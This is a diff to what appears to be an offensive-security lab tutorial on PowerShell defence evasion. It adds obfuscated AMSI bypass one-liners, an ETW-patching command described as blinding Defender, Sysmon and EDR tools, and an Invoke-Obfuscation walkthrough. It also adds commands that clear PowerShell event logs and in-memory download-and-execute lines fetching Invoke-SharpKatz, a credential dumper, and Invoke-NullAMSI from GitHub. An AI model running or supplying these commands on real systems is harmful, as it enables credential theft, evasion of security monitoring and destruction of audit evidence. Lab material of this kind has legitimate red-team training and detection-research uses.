@@ -79,7 +79,13 @@ The output should be like this :
 
 ![image](./images/ps_defsettings.jpg)
 
-Let's open a powershell terminal and run SharpKatz from memory with IEX (Invoke Expression)
+Before we start let's clear the powershell event logs, so there's no noise from before in there. You can do this by opening a powershell console and typing the following command:
+
+```powershell
+wevtutil cl "Microsoft-Windows-PowerShell/Operational"
+```
+
+Now from the same powershell terminal, run SharpKatz from memory with IEX (Invoke Expression)
 
 ```Powershell
 IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/crimsoncore/Invoke-SharpKatz/refs/heads/main/Invoke-SharpKatz.ps1");Invoke-SharpKatz
@@ -89,9 +95,88 @@ We'll see the script won't execute since AMSI has scanned it and determined it a
 
 ![image](./images/ps_invokesharkpkatzblocked.jpg)
 
+Let's have a look at the EventViewer logs - open EventViewer, select **"Application and Services Logs"**, **"Microsoft"**,**"Windows"**, **"Powershell"** and finally **"Operational"**.
 
-AMSI
-Invoke-Obfuscastion
+![image](./images/ps_eventvwr.jpg)
+
+
+
+**AMSI Bypass**
+
+Let's clear the powershell event logs again:
+
+```powershell
+wevtutil cl "Microsoft-Windows-PowerShell/Operational"
+```
+
+And now let's run an obfuscated AMSI Bypass from the same powershell terminal:
+
+```powershell
+sET-ItEM ( 'V'+'aR' +  'IA' + 'blE:1q2'  + 'uZx'  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    GeT-VariaBle  ( "1Q2U"  +"zX"  )  -VaL )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System'  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f'amsi','d','InitFaile'  ),(  "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c, ' ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
+```
+
+And let's try that Invoke-SharpKatz again, if all goes well, AMSI should be patched and the script will run:
+
+Success!!!
+
+However bypassing AMSI doesn't disable eventlogs - which are useful telemetry for EDR's, SIEM's and UEBA's. Let's open Eventviewer again and see what was logged.
+
+A very cool Forensics tools that can anaylyze powershell logs is `Powershell-Hunter` - if we run this on our powershell logs it will also flag some suspicious commands.
+
+Ideally we don't want any of these logs to be generated and thus shutting off the telemety for security solutions, we can do this by patchin ETW (Event Tracing for Windows).
+
+Let's clear the powershell event logs again before we apply the ETW bypass (remember AMSI is already patched so this ETW bypass doesn't need to be obfuscated):
+
+```powershell
+wevtutil cl "Microsoft-Windows-PowerShell/Operational"
+```
+
+**ETW Bypass**
+
+```powershell
+[Reflection.Assembly]::LoadWithPartialName('System.Core').GetType('System.Diagnostics.Eventing.EventProvider').GetField('m_enabled','NonPublic,Instance').SetValue([Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider').GetField('etwProvider','NonPublic,Static').GetValue($null),0)
+```
+
+In summary, this command does the following:
+
+>**[+]** Uses reflection to access internal, non-public fields in .NET classes.
+>
+>**[+]** Targets the etwProvider object within PowerShell’s PSEtwLogProvider class, which handles ETW logging.
+>
+>**[+]** Sets the m_enabled field of the underlying EventProvider to false, disabling ETW event logging for PowerShell activities.
+>
+>**Result**: PowerShell commands, script blocks, and other activities that would normally be logged via ETW (e.g., for security monitoring or auditing) will no longer generate ETW events, making them harder to detect by security tools like Windows Defender, Sysmon, or other EDR solutions that rely on ETW.
+
+If we want to use this first, without an AMSI Bypass, we'll have to obuscate it, otherwise AMSI will trigger on this code. We'll use `Invoke-Obfuscastion`.
+
+```powershell
+cd \thev\invoke-obfuscation
+import-module invoke-obfuscation.psd1
+invoke obfuscation
+```
+
+
+![image](./images/ps_obfuscopen.jpg)
+
+then we'll enter our script into Invoke-Obfuscation.
+
+```powershell
+SET SCRIPTBLOCK [Reflection.Assembly]::LoadWithPartialName('System.Core').GetType('System.Diagnostics.Eventing.EventProvider').GetField('m_enabled','NonPublic,Instance').SetValue([Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider').GetField('etwProvider','NonPublic,Static').GetValue($null),0)
+```
+
+Next we'll select "token", "string" and "2", re-order.
+
+Our output command is now:
+
+```powershell
+[Reflection.Assembly]::LoadWithPartialName(("{1}{0}{2}" -f 'm.Co','Syste','re')).GetType(("{10}{0}{6}{7}{1}{4}{11}{5}{8}{2}{9}{3}"-f '.D','i','Event','ider','cs','Eventi','iagnos','t','ng.','Prov','System','.')).GetField(("{0}{1}{2}" -f 'm','_e','nabled'),("{1}{2}{0}{3}{4}"-f 'P','No','n','ublic,I','nstance')).SetValue([Ref].Assembly.GetType(("{5}{7}{6}{4}{0}{9}{8}{2}{11}{10}{3}{1}"-f 'nagement.','er','n','rovid','Ma','Syst','.','em','tomatio','Au','cing.PSEtwLogP','.Tra')).GetField(("{0}{1}{3}{2}"-f'et','wP','vider','ro'),("{1}{3}{2}{0}"-f'tic','No','ic,Sta','nPubl')).GetValue($null),0)
+```
+
+With "copy" we can copy it to our clipboard, open a new powershell and past the command. Then check eventviewer!
+
+![image](./images/ps_obfuscate.jpg)
+
+
 powershell shellcode loader (without amsi bypass)
 
 ```powershell
@@ -142,3 +227,21 @@ $thread.Invoke()
 # Wait for thread to exit (optional)
 [System.Threading.Thread]::Sleep(-1)
 ```
+
+# AMSI and ETW bypass in 1:
+https://github.com/BlackShell256/Null-AMSI?tab=readme-ov-file
+
+```powershell
+iex (iwr -UseBasicParsing https://raw.githubusercontent.com/BlackShell256/Null-AMSI/refs/heads/main/Invoke-NullAMSI.ps1);Invoke-NullAmsi -etw -v;IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/crimsoncore/Invoke-SharpKatz/refs/heads/main/Invoke-SharpKatz.ps1");Invoke-SharpKatz
+```
+
+Another AMSI Bypass:
+
+```powershell
+$t=[Ref].Assembly.GetType(('System.Manage'+'ment.Automa'+'tion.AmsiUtils'));
+$f=$t.GetField(('amsiIn'+'itFailed'),'NonPublic,Static');
+$f.SetValue($null,$true);
+```
+<https://medium.com/@0xHossam/powershell-exploits-modern-apts-and-their-malicious-scripting-tactics-7f98b0e8090c>
+
+includes c-code!!!
